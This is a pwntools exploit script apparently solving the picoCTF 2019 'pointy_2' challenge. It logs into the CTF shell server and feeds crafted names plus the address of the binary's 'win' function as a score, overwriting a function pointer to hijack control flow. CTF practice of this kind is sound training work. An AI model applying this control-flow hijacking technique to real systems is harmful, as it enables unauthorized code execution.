#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --user numin0us --pass  --path /problems/pointy_2_030e643c8a0e842516b1c6a3ff826144/vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 22)
user = args.USER or 'numin0us'
password = args.PASSWORD or ''
remote_path = '/problems/pointy_2_030e643c8a0e842516b1c6a3ff826144/vuln'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(str.encode(os.path.dirname(remote_path)))

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
io.sendlineafter("Input the name of a student\n", "james")
io.sendlineafter("Input the name of the favorite professor of a student \n",
                 "ralph")
io.sendlineafter("Input the name of the student that will give the score \n",
                 "james")
io.sendlineafter("Input the name of the professor that will be scored \n",
                 "james")
io.sendlineafter("Input the score: \n", str(exe.sym.win))

io.sendlineafter("Input the name of a student\n", "james")
io.sendlineafter("Input the name of the favorite professor of a student \n",
                 "ralph")
io.sendlineafter("Input the name of the student that will give the score \n",
                 "james")
io.sendlineafter("Input the name of the professor that will be scored \n",
                 "james")
io.sendlineafter("Input the score: \n", str(exe.sym.win))
response = io.recv()

print(response)
sys.exit()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

